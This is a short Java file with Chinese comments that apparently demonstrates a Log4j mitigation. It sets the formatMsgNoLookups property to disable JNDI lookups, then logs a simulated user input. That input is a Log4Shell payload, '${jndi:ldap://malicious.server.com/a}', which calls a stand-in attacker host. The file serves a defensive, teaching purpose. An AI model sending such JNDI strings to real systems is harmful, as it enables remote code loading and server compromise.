import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class SecureApp {
    private static final Logger logger = LogManager.getLogger(SecureApp.class);

    static {
        // 禁用 JNDI Lookup
        System.setProperty("log4j2.formatMsgNoLookups", "true");
    }

    public static void main(String[] args) {
        // 模拟用户输入
        String userInput = "${jndi:ldap://malicious.server.com/a}";
        // 记录用户输入
        logger.info("User input: " + userInput);
    }
}
